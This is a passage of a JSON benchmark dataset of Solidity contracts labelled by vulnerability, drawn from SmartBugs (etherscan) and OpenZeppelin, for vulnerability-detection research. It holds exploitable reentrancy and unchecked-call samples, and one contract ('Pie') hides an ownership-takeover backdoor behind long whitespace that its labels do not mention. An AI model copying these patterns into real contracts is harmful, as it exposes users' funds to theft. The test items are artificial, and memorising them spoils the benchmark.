    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n         // <yes> <report> UNCHECKED_LL_CALLS\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[_addr]>0)\n        {\n            if(_addr.call.value(_wei)())\n            {\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n}",
    "num_lines": 100,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC721",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (token/ERC721/ERC721.sol)\n\npragma solidity ^0.8.24;\n\nimport {IERC721} from \"./IERC721.sol\";\nimport {IERC721Metadata} from \"./extensions/IERC721Metadata.sol\";\nimport {ERC721Utils} from \"./utils/ERC721Utils.sol\";\nimport {Context} from \"../../utils/Context.sol\";\nimport {Strings} from \"../../utils/Strings.sol\";\nimport {IERC165, ERC165} from \"../../utils/introspection/ERC165.sol\";\nimport {IERC721Errors} from \"../../interfaces/draft-IERC6093.sol\";\n\n/**\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC-721] Non-Fungible Token Standard, including\n * the Metadata extension, but not including the Enumerable extension, which is available separately as\n * {ERC721Enumerable}.\n */\nabstract contract ERC721 is Context, ERC165, IERC721, IERC721Metadata, IERC721Errors {\n    using Strings for uint256;\n\n    // Token name\n    string private _name;\n\n    // Token symbol\n    string private _symbol;\n\n    mapping(uint256 tokenId => address) private _owners;\n\n    mapping(address owner => uint256) private _balances;\n\n    mapping(uint256 tokenId => address) private _tokenApprovals;\n\n    mapping(address owner => mapping(address operator => bool)) private _operatorApprovals;\n\n    /**\n     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /// @inheritdoc IERC165\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\n        return\n            interfaceId == type(IERC721).interfaceId ||\n            interfaceId == type(IERC721Metadata).interfaceId ||\n            super.supportsInterface(interfaceId);\n    }\n\n    /// @inheritdoc IERC721\n    function balanceOf(address owner) public view virtual returns (uint256) {\n        if (owner == address(0)) {\n            revert ERC721InvalidOwner(address(0));\n        }\n        return _balances[owner];\n    }\n\n    /// @inheritdoc IERC721\n    function ownerOf(uint256 tokenId) public view virtual returns (address) {\n        return _requireOwned(tokenId);\n    }\n\n    /// @inheritdoc IERC721Metadata\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    /// @inheritdoc IERC721Metadata\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    /// @inheritdoc IERC721Metadata\n    function tokenURI(uint256 tokenId) public view virtual returns (string memory) {\n        _requireOwned(tokenId);\n\n        string memory baseURI = _baseURI();\n        return bytes(baseURI).length > 0 ? string.concat(baseURI, tokenId.toString()) : \"\";\n    }\n\n    /**\n     * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each\n     * token will be the concatenation of the `baseURI` and the `tokenId`. Empty\n     * by default, can be overridden in child contracts.\n     */\n    function _baseURI() internal view virtual returns (string memory) {\n        return \"\";\n    }\n\n    /// @inheritdoc IERC721\n    function approve(address to, uint256 tokenId) public virtual {\n        _approve(to, tokenId, _msgSender());\n    }\n\n    /// @inheritdoc IERC721\n    function getApproved(uint256 tokenId) public view virtual returns (address) {\n        _requireOwned(tokenId);\n\n        return _getApproved(tokenId);\n    }\n\n    /// @inheritdoc IERC721\n    function setApprovalForAll(address operator, bool approved) public virtual {\n        _setApprovalForAll(_msgSender(), operator, approved);\n    }\n\n    /// @inheritdoc IERC721\n    function isApprovedForAll(address owner, address operator) public view virtual returns (bool) {\n        return _operatorApprovals[owner][operator];\n    }\n\n    /// @inheritdoc IERC721\n    function transferFrom(address from, address to, uint256 tokenId) public virtual {\n        if (to == address(0)) {\n            revert ERC721InvalidReceiver(address(0));\n        }\n        // Setting an \"auth\" arguments enables the `_isAuthorized` check which verifies that the token exists\n        // (from != 0). Therefore, it is not needed to verify that the return value is not 0 here.\n        address previousOwner = _update(to, tokenId, _msgSender());\n        if (previousOwner != from) {\n            revert ERC721IncorrectOwner(from, tokenId, previousOwner);\n        }\n    }\n\n    /// @inheritdoc IERC721\n    function safeTransferFrom(address from, address to, uint256 tokenId) public {\n        safeTransferFrom(from, to, tokenId, \"\");\n    }\n\n    /// @inheritdoc IERC721\n    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) public virtual {\n        transferFrom(from, to, tokenId);\n        ERC721Utils.checkOnERC721Received(_msgSender(), from, to, tokenId, data);\n    }\n\n    /**\n     * @dev Returns the owner of the `tokenId`. Does NOT revert if token doesn't exist\n     *\n     * IMPORTANT: Any overrides to this function that add ownership of tokens not tracked by the\n     * core ERC-721 logic MUST be matched with the use of {_increaseBalance} to keep balances\n     * consistent with ownership. The invariant to preserve is that for any address `a` the value returned by\n     * `balanceOf(a)` must be equal to the number of tokens such that `_ownerOf(tokenId)` is `a`.\n     */\n    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {\n        return _owners[tokenId];\n    }\n\n    /**\n     * @dev Returns the approved address for `tokenId`. Returns 0 if `tokenId` is not minted.\n     */\n    function _getApproved(uint256 tokenId) internal view virtual returns (address) {\n        return _tokenApprovals[tokenId];\n    }\n\n    /**\n     * @dev Returns whether `spender` is allowed to manage `owner`'s tokens, or `tokenId` in\n     * particular (ignoring whether it is owned by `owner`).\n     *\n     * WARNING: This function assumes that `owner` is the actual owner of `tokenId` and does not verify this\n     * assumption.\n     */\n    function _isAuthorized(address owner, address spender, uint256 tokenId) internal view virtual returns (bool) {\n        return\n            spender != address(0) &&\n            (owner == spender || isApprovedForAll(owner, spender) || _getApproved(tokenId) == spender);\n    }\n\n    /**\n     * @dev Checks if `spender` can operate on `tokenId`, assuming the provided `owner` is the actual owner.\n     * Reverts if:\n     * - `spender` does not have approval from `owner` for `tokenId`.\n     * - `spender` does not have approval to manage all of `owner`'s assets.\n     *\n     * WARNING: This function assumes that `owner` is the actual owner of `tokenId` and does not verify this\n     * assumption.\n     */\n    function _checkAuthorized(address owner, address spender, uint256 tokenId) internal view virtual {\n        if (!_isAuthorized(owner, spender, tokenId)) {\n            if (owner == address(0)) {\n                revert ERC721NonexistentToken(tokenId);\n            } else {\n                revert ERC721InsufficientApproval(spender, tokenId);\n            }\n        }\n    }\n\n    /**\n     * @dev Unsafe write access to the balances, used by extensions that \"mint\" tokens using an {ownerOf} override.\n     *\n     * NOTE: the value is limited to type(uint128).max. This protect against _balance overflow. It is unrealistic that\n     * a uint256 would ever overflow from increments when these increments are bounded to uint128 values.\n     *\n     * WARNING: Increasing an account's balance using this function tends to be paired with an override of the\n     * {_ownerOf} function to resolve the ownership of the corresponding tokens so that balances and ownership\n     * remain consistent with one another.\n     */\n    function _increaseBalance(address account, uint128 value) internal virtual {\n        unchecked {\n            _balances[account] += value;\n        }\n    }\n\n    /**\n     * @dev Transfers `tokenId` from its current owner to `to`, or alternatively mints (or burns) if the current owner\n     * (or `to`) is the zero address. Returns the owner of the `tokenId` before the update.\n     *\n     * The `auth` argument is optional. If the value passed is non 0, then this function will check that\n     * `auth` is either the owner of the token, or approved to operate on the token (by the owner).\n     *\n     * Emits a {Transfer} event.\n     *\n     * NOTE: If overriding this function in a way that tracks balances, see also {_increaseBalance}.\n     */\n    function _update(address to, uint256 tokenId, address auth) internal virtual returns (address) {\n        address from = _ownerOf(tokenId);\n\n        // Perform (optional) operator check\n        if (auth != address(0)) {\n            _checkAuthorized(from, auth, tokenId);\n        }\n\n        // Execute the update\n        if (from != address(0)) {\n            // Clear approval. No need to re-authorize or emit the Approval event\n            _approve(address(0), tokenId, address(0), false);\n\n            unchecked {\n                _balances[from] -= 1;\n            }\n        }\n\n        if (to != address(0)) {\n            unchecked {\n                _balances[to] += 1;\n            }\n        }\n\n        _owners[tokenId] = to;\n\n        emit Transfer(from, to, tokenId);\n\n        return from;\n    }\n\n    /**\n     * @dev Mints `tokenId` and transfers it to `to`.\n     *\n     * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - `to` cannot be the zero address.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _mint(address to, uint256 tokenId) internal {\n        if (to == address(0)) {\n            revert ERC721InvalidReceiver(address(0));\n        }\n        address previousOwner = _update(to, tokenId, address(0));\n        if (previousOwner != address(0)) {\n            revert ERC721InvalidSender(address(0));\n        }\n    }\n\n    /**\n     * @dev Mints `tokenId`, transfers it to `to` and checks for `to` acceptance.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _safeMint(address to, uint256 tokenId) internal {\n        _safeMint(to, tokenId, \"\");\n    }\n\n    /**\n     * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is\n     * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.\n     */\n    function _safeMint(address to, uint256 tokenId, bytes memory data) internal virtual {\n        _mint(to, tokenId);\n        ERC721Utils.checkOnERC721Received(_msgSender(), address(0), to, tokenId, data);\n    }\n\n    /**\n     * @dev Destroys `tokenId`.\n     * The approval is cleared when the token is burned.\n     * This is an internal function that does not check if the sender is authorized to operate on the token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _burn(uint256 tokenId) internal {\n        address previousOwner = _update(address(0), tokenId, address(0));\n        if (previousOwner == address(0)) {\n            revert ERC721NonexistentToken(tokenId);\n        }\n    }\n\n    /**\n     * @dev Transfers `tokenId` from `from` to `to`.\n     *  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _transfer(address from, address to, uint256 tokenId) internal {\n        if (to == address(0)) {\n            revert ERC721InvalidReceiver(address(0));\n        }\n        address previousOwner = _update(to, tokenId, address(0));\n        if (previousOwner == address(0)) {\n            revert ERC721NonexistentToken(tokenId);\n        } else if (previousOwner != from) {\n            revert ERC721IncorrectOwner(from, tokenId, previousOwner);\n        }\n    }\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking that contract recipients\n     * are aware of the ERC-721 standard to prevent tokens from being forever locked.\n     *\n     * `data` is additional data, it has no specified format and it is sent in call to `to`.\n     *\n     * This internal function is like {safeTransferFrom} in the sense that it invokes\n     * {IERC721Receiver-onERC721Received} on the receiver, and can be used to e.g.\n     * implement alternative mechanisms to perform token transfer, such as signature-based.\n     *\n     * Requirements:\n     *\n     * - `tokenId` token must exist and be owned by `from`.\n     * - `to` cannot be the zero address.\n     * - `from` cannot be the zero address.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _safeTransfer(address from, address to, uint256 tokenId) internal {\n        _safeTransfer(from, to, tokenId, \"\");\n    }\n\n    /**\n     * @dev Same as {xref-ERC721-_safeTransfer-address-address-uint256-}[`_safeTransfer`], with an additional `data` parameter which is\n     * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.\n     */\n    function _safeTransfer(address from, address to, uint256 tokenId, bytes memory data) internal virtual {\n        _transfer(from, to, tokenId);\n        ERC721Utils.checkOnERC721Received(_msgSender(), from, to, tokenId, data);\n    }\n\n    /**\n     * @dev Approve `to` to operate on `tokenId`\n     *\n     * The `auth` argument is optional. If the value passed is non 0, then this function will check that `auth` is\n     * either the owner of the token, or approved to operate on all tokens held by this owner.\n     *\n     * Emits an {Approval} event.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address to, uint256 tokenId, address auth) internal {\n        _approve(to, tokenId, auth, true);\n    }\n\n    /**\n     * @dev Variant of `_approve` with an optional flag to enable or disable the {Approval} event. The event is not\n     * emitted in the context of transfers.\n     */\n    function _approve(address to, uint256 tokenId, address auth, bool emitEvent) internal virtual {\n        // Avoid reading the owner unless necessary\n        if (emitEvent || auth != address(0)) {\n            address owner = _requireOwned(tokenId);\n\n            // We do not use _isAuthorized because single-token approvals should not be able to call approve\n            if (auth != address(0) && owner != auth && !isApprovedForAll(owner, auth)) {\n                revert ERC721InvalidApprover(auth);\n            }\n\n            if (emitEvent) {\n                emit Approval(owner, to, tokenId);\n            }\n        }\n\n        _tokenApprovals[tokenId] = to;\n    }\n\n    /**\n     * @dev Approve `operator` to operate on all of `owner` tokens\n     *\n     * Requirements:\n     * - operator can't be the address zero.\n     *\n     * Emits an {ApprovalForAll} event.\n     */\n    function _setApprovalForAll(address owner, address operator, bool approved) internal virtual {\n        if (owner == address(0)) {\n            revert ERC721InvalidApprover(address(0));\n        }\n        if (operator == address(0)) {\n            revert ERC721InvalidOperator(operator);\n        }\n        _operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    }\n\n    /**\n     * @dev Reverts if the `tokenId` doesn't have a current owner (it hasn't been minted, or it has been burned).\n     * Returns the owner.\n     *\n     * Overrides to ownership logic should be done to {_ownerOf}.\n     */\n    function _requireOwned(uint256 tokenId) internal view returns (address) {\n        address owner = _ownerOf(tokenId);\n        if (owner == address(0)) {\n            revert ERC721NonexistentToken(tokenId);\n        }\n        return owner;\n    }\n}\n",
    "num_lines": 434,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x7541b76cb60f4c60af330c208b0623b7f54bf615",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract U_BANK\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 2 ether;    \n\n    function U_BANK(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 85,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "draft-InteroperableAddress",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/draft-InteroperableAddress.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (utils/draft-InteroperableAddress.sol)\n\npragma solidity ^0.8.26;\n\nimport {Math} from \"./math/Math.sol\";\nimport {SafeCast} from \"./math/SafeCast.sol\";\nimport {Bytes} from \"./Bytes.sol\";\nimport {Calldata} from \"./Calldata.sol\";\n\n/**\n * @dev Helper library to format and parse https://ethereum-magicians.org/t/erc-7930-interoperable-addresses/23365[ERC-7930] interoperable\n * addresses.\n */\nlibrary InteroperableAddress {\n    using SafeCast for uint256;\n    using Bytes for bytes;\n\n    error InteroperableAddressParsingError(bytes);\n    error InteroperableAddressEmptyReferenceAndAddress();\n\n    /**\n     * @dev Format an ERC-7930 interoperable address (version 1) from its components `chainType`, `chainReference`\n     * and `addr`. This is a generic function that supports any chain type, chain reference and address supported by\n     * ERC-7930, including interoperable addresses with empty chain reference or empty address.\n     */\n    function formatV1(\n        bytes2 chainType,\n        bytes memory chainReference,\n        bytes memory addr\n    ) internal pure returns (bytes memory) {\n        require(chainReference.length > 0 || addr.length > 0, InteroperableAddressEmptyReferenceAndAddress());\n        return\n            abi.encodePacked(\n                bytes2(0x0001),\n                chainType,\n                chainReference.length.toUint8(),\n                chainReference,\n                addr.length.toUint8(),\n                addr\n            );\n    }\n\n    /**\n     * @dev Variant of {formatV1-bytes2-bytes-bytes-} specific to EVM chains. Returns the ERC-7930 interoperable\n     * address (version 1) for a given chainid and ethereum address.\n     */\n    function formatEvmV1(uint256 chainid, address addr) internal pure returns (bytes memory) {\n        bytes memory chainReference = _toChainReference(chainid);\n        return abi.encodePacked(bytes4(0x00010000), uint8(chainReference.length), chainReference, uint8(20), addr);\n    }\n\n    /**\n     * @dev Variant of {formatV1-bytes2-bytes-bytes-} that specifies an EVM chain without an address.\n     */\n    function formatEvmV1(uint256 chainid) internal pure returns (bytes memory) {\n        bytes memory chainReference = _toChainReference(chainid);\n        return abi.encodePacked(bytes4(0x00010000), uint8(chainReference.length), chainReference, uint8(0));\n    }\n\n    /**\n     * @dev Variant of {formatV1-bytes2-bytes-bytes-} that specifies an EVM address without a chain reference.\n     */\n    function formatEvmV1(address addr) internal pure returns (bytes memory) {\n        return abi.encodePacked(bytes6(0x000100000014), addr);\n    }\n\n    /**\n     * @dev Parse a ERC-7930 interoperable address (version 1) into its different components. Reverts if the input is\n     * not following a version 1 of ERC-7930\n     */\n    function parseV1(\n        bytes memory self\n    ) internal pure returns (bytes2 chainType, bytes memory chainReference, bytes memory addr) {\n        bool success;\n        (success, chainType, chainReference, addr) = tryParseV1(self);\n        require(success, InteroperableAddressParsingError(self));\n    }\n\n    /**\n     * @dev Variant of {parseV1} that handles calldata slices to reduce memory copy costs.\n     */\n    function parseV1Calldata(\n        bytes calldata self\n    ) internal pure returns (bytes2 chainType, bytes calldata chainReference, bytes calldata addr) {\n        bool success;\n        (success, chainType, chainReference, addr) = tryParseV1Calldata(self);\n        require(success, InteroperableAddressParsingError(self));\n    }\n\n    /**\n     * @dev Variant of {parseV1} that does not revert on invalid input. Instead, it returns `false` as the first\n     * return value to indicate parsing failure when the input does not follow version 1 of ERC-7930.\n     */\n    function tryParseV1(\n        bytes memory self\n    ) internal pure returns (bool success, bytes2 chainType, bytes memory chainReference, bytes memory addr) {\n        unchecked {\n            success = true;\n            if (self.length < 0x06) return (false, 0x0000, _emptyBytesMemory(), _emptyBytesMemory());\n\n            bytes2 version = _readBytes2(self, 0x00);\n            if (version != bytes2(0x0001)) return (false, 0x0000, _emptyBytesMemory(), _emptyBytesMemory());\n            chainType = _readBytes2(self, 0x02);\n\n            uint8 chainReferenceLength = uint8(self[0x04]);\n            if (self.length < 0x06 + chainReferenceLength)\n                return (false, 0x0000, _emptyBytesMemory(), _emptyBytesMemory());\n            chainReference = self.slice(0x05, 0x05 + chainReferenceLength);\n\n            uint8 addrLength = uint8(self[0x05 + chainReferenceLength]);\n            if (self.length < 0x06 + chainReferenceLength + addrLength)\n                return (false, 0x0000, _emptyBytesMemory(), _emptyBytesMemory());\n            addr = self.slice(0x06 + chainReferenceLength, 0x06 + chainReferenceLength + addrLength);\n        }\n    }\n\n    /**\n     * @dev Variant of {tryParseV1} that handles calldata slices to reduce memory copy costs.\n     */\n    function tryParseV1Calldata(\n        bytes calldata self\n    ) internal pure returns (bool success, bytes2 chainType, bytes calldata chainReference, bytes calldata addr) {\n        unchecked {\n            success = true;\n            if (self.length < 0x06) return (false, 0x0000, Calldata.emptyBytes(), Calldata.emptyBytes());\n\n            bytes2 version = _readBytes2Calldata(self, 0x00);\n            if (version != bytes2(0x0001)) return (false, 0x0000, Calldata.emptyBytes(), Calldata.emptyBytes());\n            chainType = _readBytes2Calldata(self, 0x02);\n\n            uint8 chainReferenceLength = uint8(self[0x04]);\n            if (self.length < 0x06 + chainReferenceLength)\n                return (false, 0x0000, Calldata.emptyBytes(), Calldata.emptyBytes());\n            chainReference = self[0x05:0x05 + chainReferenceLength];\n\n            uint8 addrLength = uint8(self[0x05 + chainReferenceLength]);\n            if (self.length < 0x06 + chainReferenceLength + addrLength)\n                return (false, 0x0000, Calldata.emptyBytes(), Calldata.emptyBytes());\n            addr = self[0x06 + chainReferenceLength:0x06 + chainReferenceLength + addrLength];\n        }\n    }\n\n    /**\n     * @dev Parse a ERC-7930 interoperable address (version 1) corresponding to an EIP-155 chain. The `chainId` and\n     * `addr` return values will be zero if the input doesn't include a chainReference or an address, respectively.\n     *\n     * Requirements:\n     *\n     * * The input must be a valid ERC-7930 interoperable address (version 1)\n     * * The underlying chainType must be \"eip-155\"\n     */\n    function parseEvmV1(bytes memory self) internal pure returns (uint256 chainId, address addr) {\n        bool success;\n        (success, chainId, addr) = tryParseEvmV1(self);\n        require(success, InteroperableAddressParsingError(self));\n    }\n\n    /**\n     * @dev Variant of {parseEvmV1} that handles calldata slices to reduce memory copy costs.\n     */\n    function parseEvmV1Calldata(bytes calldata self) internal pure returns (uint256 chainId, address addr) {\n        bool success;\n        (success, chainId, addr) = tryParseEvmV1Calldata(self);\n        require(success, InteroperableAddressParsingError(self));\n    }\n\n    /**\n     * @dev Variant of {parseEvmV1} that does not revert on invalid input. Instead, it returns `false` as the first\n     * return value to indicate parsing failure when the input does not follow version 1 of ERC-7930.\n     */\n    function tryParseEvmV1(bytes memory self) internal pure returns (bool success, uint256 chainId, address addr) {\n        (bool success_, bytes2 chainType_, bytes memory chainReference_, bytes memory addr_) = tryParseV1(self);\n        return\n            (success_ &&\n                chainType_ == 0x0000 &&\n                chainReference_.length < 33 &&\n                (addr_.length == 0 || addr_.length == 20))\n                ? (\n                    true,\n                    uint256(bytes32(chainReference_)) >> (256 - 8 * chainReference_.length),\n                    address(bytes20(addr_))\n                )\n                : (false, 0, address(0));\n    }\n\n    /**\n     * @dev Variant of {tryParseEvmV1} that handles calldata slices to reduce memory copy costs.\n     */\n    function tryParseEvmV1Calldata(\n        bytes calldata self\n    ) internal pure returns (bool success, uint256 chainId, address addr) {\n        (bool success_, bytes2 chainType_, bytes calldata chainReference_, bytes calldata addr_) = tryParseV1Calldata(\n            self\n        );\n        return\n            (success_ &&\n                chainType_ == 0x0000 &&\n                chainReference_.length < 33 &&\n                (addr_.length == 0 || addr_.length == 20))\n                ? (\n                    true,\n                    uint256(bytes32(chainReference_)) >> (256 - 8 * chainReference_.length),\n                    address(bytes20(addr_))\n                )\n                : (false, 0, address(0));\n    }\n\n    function _toChainReference(uint256 chainid) private pure returns (bytes memory) {\n        unchecked {\n            // length fits in a uint8: log256(type(uint256).max) is 31\n            uint256 length = Math.log256(chainid) + 1;\n            return abi.encodePacked(chainid).slice(32 - length);\n        }\n    }\n\n    function _readBytes2(bytes memory buffer, uint256 offset) private pure returns (bytes2 value) {\n        // This is not memory safe in the general case, but all calls to this private function are within bounds.\n        assembly (\"memory-safe\") {\n            value := shl(240, shr(240, mload(add(add(buffer, 0x20), offset))))\n        }\n    }\n\n    function _readBytes2Calldata(bytes calldata buffer, uint256 offset) private pure returns (bytes2 value) {\n        assembly (\"memory-safe\") {\n            value := shl(240, shr(240, calldataload(add(buffer.offset, offset))))\n        }\n    }\n\n    function _emptyBytesMemory() private pure returns (bytes memory result) {\n        assembly (\"memory-safe\") {\n            result := 0x60 // mload(0x60) is always 0\n        }\n    }\n}\n",
    "num_lines": 236,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x806a6bd219f162442d992bdc4ee6eba1f2c5a707",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Pie\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetPie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "num_lines": 46,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "reentrancy_bonus",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/reentrancy_bonus.sol",
    "contract_code": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/\n * @author: consensys\n * @vulnerable_at_lines: 28\n */\n\npragma solidity ^0.4.24;\n\ncontract Reentrancy_bonus{\n\n    // INSECURE\n    mapping (address => uint) private userBalances;\n    mapping (address => bool) private claimedBonus;\n    mapping (address => uint) private rewardsForA;\n\n    function withdrawReward(address recipient) public {\n        uint amountToWithdraw = rewardsForA[recipient];\n        rewardsForA[recipient] = 0;\n        (bool success, ) = recipient.call.value(amountToWithdraw)(\"\");\n        require(success);\n    }\n\n    function getFirstWithdrawalBonus(address recipient) public {\n        require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once\n\n        rewardsForA[recipient] += 100;\n        // <yes> <report> REENTRANCY\n        withdrawReward(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.\n        claimedBonus[recipient] = true;\n    }\n}\n",
    "num_lines": 32,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "GovernorPreventLateQuorum",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/governance/extensions/GovernorPreventLateQuorum.sol",
